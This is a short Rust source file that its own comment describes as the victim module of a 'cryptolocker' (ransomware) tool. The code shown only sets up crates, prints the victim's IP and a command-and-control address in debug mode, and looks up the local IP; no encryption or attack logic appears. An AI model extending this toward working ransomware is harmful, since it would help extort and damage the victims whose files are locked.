// lockjaw is the victim module for the tetanus cryptolocker tool
const DBUG: i32 = 1;

extern crate std;
extern crate local_ip;
extern crate rand;
extern crate crypto;

use std::io;
use std::env;
use crypto::digest::Digest;
use crypto::sha2::Sha256;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};


pub fn init(c2: std::string::String) {
    if DBUG == 1 {
        println!("lockjaw module initialized!");
        println!("victim: {} ", get_ip());
        println!("talking to: {} ", c2);
    }
}

pub fn get_ip() -> std::net::IpAddr  {
// returns the local ip address of the host
    let default = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
    local_ip::get().unwrap_or(default)
}
